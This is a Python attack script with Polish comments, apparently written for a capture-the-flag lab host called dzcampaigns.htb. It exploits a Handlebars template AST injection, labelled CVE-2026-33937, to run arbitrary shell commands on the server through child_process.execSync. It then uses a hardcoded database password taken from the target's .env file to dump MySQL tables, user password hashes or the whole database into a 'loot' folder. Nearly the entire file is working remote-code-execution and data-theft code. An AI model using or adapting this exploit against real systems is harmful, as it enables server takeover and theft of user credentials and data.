#!/usr/bin/env python3
"""
Dump MySQL z dzcampaigns przez CVE-2026-33937 (Handlebars AST RCE).

Wymaga:
  - VPN + host 10.129.49.242
  - zalogowanej sesji w loot/auth-ania.txt (ania / jakikolwiek user)
  - rce działa (campaign_message jako obiekt AST)

Przykłady:
  ./db_dump.py
  ./db_dump.py --tables
  ./db_dump.py --sql "SELECT id,email,username,role FROM users"
  ./db_dump.py --full -o ../loot/db-full.sql
  ./db_dump.py --table users
"""
from __future__ import annotations

import argparse
import base64
import html as html_lib
import json
import re
import subprocess
import sys
import time
from pathlib import Path

BASE = "http://10.129.49.242"
HOST = "dzcampaigns.htb"
WORK = Path(__file__).resolve().parents[1]
JAR = WORK / "loot" / "auth-ania.txt"
LOOT = WORK / "loot"

# z .env (RCE) — override env jeśli chcesz
DB_USER = "darkzero"
DB_PASS = "C4ntFindMyDMpass!"
DB_NAME = "darkzero_campaigns"


def _curl(args: list[str], timeout: int = 30) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["curl", "-sS", "--max-time", str(timeout), *args],
        capture_output=True,
        text=True,
    )


def get_csrf() -> str:
    if not JAR.exists():
        sys.exit(f"Brak jar: {JAR} — najpierw login (ania)")
    r = _curl(
        [
            "-b",
            str(JAR),
            "-c",
            str(JAR),
            "-H",
            f"Host: {HOST}",
            f"{BASE}/character/new",
            "-o",
            "/tmp/dz-csrf.html",
        ],
        timeout=15,
    )
    if r.returncode != 0:
        sys.exit(f"curl character/new fail: {r.stderr}")
    h = Path("/tmp/dz-csrf.html").read_text(errors="replace")
    if "login" in h.lower() and "password" in h.lower() and "ania" not in h.lower():
        sys.exit("Sesja padła — zaloguj się i odśwież loot/auth-ania.txt")
    m = re.search(r'name="_csrf"\s+value="([^"]+)"', h)
    if not m:
        sys.exit("Brak CSRF — sprawdź auth jar")
    return m.group(1)


def make_ast(js_expr: str) -> dict:
    return {
        "type": "Program",
        "body": [
            {
                "type": "MustacheStatement",
                "path": {
                    "type": "PathExpression",
                    "data": False,
                    "depth": 0,
                    "parts": ["lookup"],
                    "original": "lookup",
                    "loc": None,
                },
                "params": [
                    {
                        "type": "PathExpression",
                        "data": False,
                        "depth": 0,
                        "parts": [],
                        "original": "this",
                        "loc": None,
                    },
                    {
                        "type": "NumberLiteral",
                        "value": js_expr,
                        "original": 1,
                        "loc": None,
                    },
                ],
                "escaped": True,
                "strip": {"open": False, "close": False},
                "loc": None,
            }
        ],
        "strip": {},
        "loc": None,
    }


def rce(cmd: str, wait: float = 0.8) -> str:
    """Odpal cmd na hostie; stdout wraca jako ostatnia wiadomość w /campaign/1."""
    b64 = base64.b64encode(cmd.encode()).decode()
    js = (
        '{},{})) + process.mainModule.require("child_process")'
        f'.execSync(Buffer.from("{b64}","base64").toString()).toString() //'
    )
    csrf = get_csrf()
    body = {
        "name": f"db{int(time.time()) % 999999}",
        "race": "E",
        "class": "M",
        "backstory": "b",
        "campaign_id": 1,
        "campaign_message": make_ast(js),
    }
    Path("/tmp/dz-body.json").write_text(json.dumps(body))
    r = _curl(
        [
            "-b",
            str(JAR),
            "-c",
            str(JAR),
            "-H",
            f"Host: {HOST}",
            "-X",
            "POST",
            f"{BASE}/character",
            "-H",
            "Content-Type: application/json",
            "-H",
            f"X-CSRF-Token: {csrf}",
            "--data-binary",
            "@/tmp/dz-body.json",
            "-o",
            "/tmp/dz-post.out",
            "-w",
            "%{http_code}",
        ],
        timeout=45,
    )
    code = r.stdout.strip()
    if code not in ("200", "302"):
        err = Path("/tmp/dz-post.out").read_text(errors="replace")[:200]
        sys.exit(f"POST /character HTTP {code}: {err}")

    time.sleep(wait)
    r2 = _curl(
        ["-H", f"Host: {HOST}", f"{BASE}/campaign/1", "-o", "/tmp/dz-camp.html"],
        timeout=25,
    )
    if r2.returncode != 0:
        sys.exit(f"GET campaign fail: {r2.stderr}")
    camp = Path("/tmp/dz-camp.html").read_text(errors="replace")
    msgs = [html_lib.unescape(m) for m in re.findall(r"<p>([^<]+)</p>", camp)]
    for m in reversed(msgs):
        if "joined the campaign" in m or "Chronicle" in m:
            continue
        return m
    return ""


def mysql_cli(sql_or_flags: str, batch: bool = True) -> str:
    """sql_or_flags: albo -e 'SQL', albo argumenty mysqldump."""
    # password w CLI = warning na stderr, OK
    base = (
        f"mysql -u{DB_USER} -p{DB_PASS!r} {DB_NAME} "
        if not sql_or_flags.strip().startswith("mysqldump")
        else ""
    )
    # prostsze: zawsze pełna komenda z zewnątrz
    return rce(sql_or_flags)


def dump_tables() -> str:
    cmd = (
        f"mysql -u{DB_USER} -p'{DB_PASS}' {DB_NAME} -N -e 'SHOW TABLES;' 2>/dev/null"
    )
    return rce(cmd)


def dump_sql(sql: str) -> str:
    # -e z escaped quotes
    safe = sql.replace("'", "'\"'\"'")
    cmd = (
        f"mysql -u{DB_USER} -p'{DB_PASS}' {DB_NAME} -e '{safe}' 2>/dev/null"
    )
    return rce(cmd)


def dump_table(table: str) -> str:
    return dump_sql(f"SELECT * FROM `{table}`;")


def dump_full() -> str:
    cmd = (
        f"mysqldump -u{DB_USER} -p'{DB_PASS}' --single-transaction "
        f"--routines --triggers {DB_NAME} 2>/dev/null"
    )
    # duży dump — dłuższy wait
    return rce(cmd, wait=1.5)


def main() -> None:
    ap = argparse.ArgumentParser(description="Dump DB via Handlebars AST RCE")
    ap.add_argument("--tables", action="store_true", help="SHOW TABLES")
    ap.add_argument("--table", metavar="NAME", help="SELECT * FROM table")
    ap.add_argument("--sql", metavar="QUERY", help="dowolne SQL (-e)")
    ap.add_argument("--full", action="store_true", help="mysqldump całej bazy")
    ap.add_argument(
        "--users",
        action="store_true",
        help="szybki dump users (id,email,username,role,hash)",
    )
    ap.add_argument(
        "-o",
        "--output",
        type=Path,
        help="zapisz wynik do pliku (domyślnie loot/db-dump-*.txt)",
    )
    ap.add_argument(
        "--all-selects",
        action="store_true",
        help="dla każdej tabeli: SELECT * (może być wolne/długie)",
    )
    args = ap.parse_args()

    LOOT.mkdir(parents=True, exist_ok=True)

    if not any(
        [args.tables, args.table, args.sql, args.full, args.users, args.all_selects]
    ):
        # default: tables + users
        args.tables = True
        args.users = True

    chunks: list[str] = []

    if args.tables:
        print("[*] SHOW TABLES...", file=sys.stderr)
        out = dump_tables()
        print(out)
        chunks.append("=== SHOW TABLES ===\n" + out)

    if args.users:
        print("[*] users...", file=sys.stderr)
        out = dump_sql(
            "SELECT id, email, username, password_hash, role, created_at FROM users;"
        )
        print(out)
        chunks.append("=== users ===\n" + out)

    if args.table:
        print(f"[*] table {args.table}...", file=sys.stderr)
        out = dump_table(args.table)
        print(out)
        chunks.append(f"=== {args.table} ===\n" + out)

    if args.sql:
        print(f"[*] SQL: {args.sql[:60]}...", file=sys.stderr)
        out = dump_sql(args.sql)
        print(out)
        chunks.append("=== SQL ===\n" + out)

    if args.full:
        print("[*] mysqldump full (cierpliwość)...", file=sys.stderr)
        out = dump_full()
        print(out[:2000] + ("\n...[truncated]" if len(out) > 2000 else ""))
        chunks.append(out)

    if args.all_selects:
        print("[*] list tables then SELECT * each...", file=sys.stderr)
        tables = [t.strip() for t in dump_tables().splitlines() if t.strip()]
        # filtr warningów mysql
        tables = [t for t in tables if not t.lower().startswith("mysql:")]
        for t in tables:
            print(f"  -> {t}", file=sys.stderr)
            out = dump_table(t)
            chunks.append(f"=== {t} ===\n{out}\n")
            print(out[:500])

    if chunks:
        out_path = args.output or (
            LOOT / f"db-dump-{time.strftime('%Y%m%d-%H%M%S')}.txt"
        )
        out_path.write_text("\n\n".join(chunks))
        print(f"\n[+] zapisano: {out_path}", file=sys.stderr)


if __name__ == "__main__":
    main()
